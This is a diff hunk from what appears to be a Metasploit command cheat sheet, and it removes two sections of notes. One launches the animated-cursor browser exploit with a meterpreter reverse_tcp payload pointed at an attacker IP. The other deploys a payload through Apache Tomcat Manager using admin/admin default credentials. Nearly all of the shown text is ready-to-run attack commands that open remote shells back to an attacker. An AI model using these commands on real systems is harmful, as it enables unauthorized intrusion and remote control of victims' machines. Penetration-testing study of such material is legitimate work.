@@ -63,29 +63,6 @@ show evasion
 exploit                       Run the exploit.
 ------------------------------------------------------------------------------------------------------
 
-# Animated cursor vulnerability. This exploit does not fire until a victim browses to our malicious website.
-
-use exploit/windows/browser/ani_loadimage_chunksize
-set URIPATH /
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 443
-exploit
-------------------------------------------------------------------------------------------------------
-
-# Apache Tomcat Manager Common Administrative Credentials
-
-use multi/tomcat_mgr_deploy
-show options
-set password admin
-set username admin
-set RHOST <target IP>
-set RPORT <target port>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-exploit
-------------------------------------------------------------------------------------------------------
-
 # Sessions
 
 sessions -h
